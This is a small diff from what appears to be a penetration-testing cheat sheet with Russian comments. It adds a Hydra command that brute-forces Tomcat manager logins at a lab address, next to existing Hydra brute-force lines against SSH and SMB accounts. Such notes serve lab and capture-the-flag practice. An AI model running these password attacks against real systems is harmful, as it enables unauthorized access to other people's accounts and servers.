@@ -18,7 +18,7 @@ hydra -l micha -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.200
 
 hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
 
-
+hydra -C tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html/   (перебор ВЕБ паролей)
 
 # метасплойт в метасплойт
 
